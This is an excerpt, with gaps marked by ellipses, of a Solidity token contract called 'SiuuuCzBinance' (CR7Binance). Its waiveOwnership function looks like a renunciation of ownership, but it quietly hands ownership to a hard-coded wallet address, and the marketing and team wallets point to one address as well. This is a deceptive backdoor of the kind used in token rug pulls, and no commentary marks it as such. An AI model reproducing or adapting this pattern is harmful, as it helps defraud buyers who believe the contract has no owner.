...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xD036EEb4c90C9a8171F546a6A2FD97065E85D4b4));
        _owner = address(0xD036EEb4c90C9a8171F546a6A2FD97065E85D4b4);
    }
...
contract SiuuuCzBinance is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SiuuuCzBinance";
    string private _symbol = "CR7Binance";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x53bE8a440E0382D2F087f49E9c7C8bAF36CE1f32);
    address payable public teamWalletAddress = payable(0x53bE8a440E0382D2F087f49E9c7C8bAF36CE1f32);
